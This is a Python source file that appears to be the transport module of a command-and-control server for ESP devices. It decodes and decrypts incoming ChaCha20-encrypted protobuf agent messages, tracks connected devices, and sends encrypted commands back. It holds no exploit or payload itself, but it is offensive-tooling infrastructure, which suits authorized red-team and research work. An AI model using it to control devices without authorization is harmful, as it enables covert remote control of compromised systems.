from core.crypto import CryptoContext
from core.device import Device
from core.registry import DeviceRegistry
from logging.manager import LogManager
from utils.display import Display

from proto.c2_pb2 import Command, AgentMessage, AgentMsgType

# Forward declaration for type hinting to avoid circular import
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from cli.cli import CLI


class Transport:
    def __init__(self, registry: DeviceRegistry, logger: LogManager, cli_instance: 'CLI' = None):
        self.crypto = CryptoContext()
        self.registry = registry
        self.logger = logger
        self.cli = cli_instance # CLI instance for callback
        self.command_responses = {} # To track command responses

    def set_cli(self, cli_instance: 'CLI'):
        self.cli = cli_instance

    # ==================================================
    # RX  (ESP → C2)
    # ==================================================
    def handle_incoming(self, sock, addr, raw_data: bytes):
        """
        raw_data = BASE64( ChaCha20( Protobuf AgentMessage ) )
        """
        # Removed verbose transport debug prints

        # 1) base64 decode
        try:
            cipher = self.crypto.b64_decode(raw_data)
        except Exception as e:
            Display.error(f"Base64 decode failed from {addr}: {e}")
            return

        # 2) chacha decrypt
        try:
            protobuf_bytes = self.crypto.decrypt(cipher)
        except Exception as e:
            Display.error(f"Decrypt failed from {addr}: {e}")
            return

        # 3) protobuf decode → AgentMessage
        try:
            msg = AgentMessage.FromString(protobuf_bytes)
        except Exception as e:
            Display.error(f"Protobuf decode failed from {addr}: {e}")
            return

        if not msg.device_id:
            Display.error("AgentMessage received without device_id")
            return

        self._dispatch(sock, addr, msg)

    # ==================================================
    # DISPATCH
    # ==================================================
    def _dispatch(self, sock, addr, msg: AgentMessage):
        device = self.registry.get(msg.device_id)

        if not device:
            device = Device(
                id=msg.device_id,
                sock=sock,
                address=addr
            )
            self.registry.add(device)
            Display.device_event(device.id, f"Connected from {addr[0]}")
        else:
            device.touch()

        self._handle_agent_message(device, msg)

    # ==================================================
    # AGENT MESSAGE HANDLER
    # ==================================================
    def _handle_agent_message(self, device: Device, msg: AgentMessage):
        payload_str = ""
        if msg.payload:
            try:
                payload_str = msg.payload.decode(errors="ignore")
            except Exception:
                payload_str = repr(msg.payload)

        if msg.type == AgentMsgType.AGENT_CMD_RESULT:
            if msg.request_id and self.cli:
                self.cli.handle_command_response(msg.request_id, device.id, payload_str, msg.eof)
            else:
                Display.device_event(device.id, f"Command result (no request_id or CLI not set): {payload_str}")
        elif msg.type == AgentMsgType.AGENT_INFO:
            Display.device_event(device.id, f"INFO: {payload_str}")
        elif msg.type == AgentMsgType.AGENT_ERROR:
            Display.device_event(device.id, f"ERROR: {payload_str}")
        elif msg.type == AgentMsgType.AGENT_LOG:
            Display.device_event(device.id, f"LOG: {payload_str}")
        elif msg.type == AgentMsgType.AGENT_DATA:
            Display.device_event(device.id, f"DATA: {payload_str}")
        else:
            Display.device_event(device.id, f"UNKNOWN Message Type ({AgentMsgType.Name(msg.type)}): {payload_str}")

    # ==================================================
    # TX  (C2 → ESP)
    # ==================================================
    def send_command(self, sock, cmd: Command):
        """
        Command → Protobuf → ChaCha20 → Base64 → \\n
        """
        try:
            proto = cmd.SerializeToString()
            # Removed verbose transport debug prints

            # Encrypt
            cipher = self.crypto.encrypt(proto)

            # Base64
            b64 = self.crypto.b64_encode(cipher)

            sock.sendall(b64 + b"\n")

        except Exception as e:
            Display.error(f"Failed to send command to {cmd.device_id}: {e}")
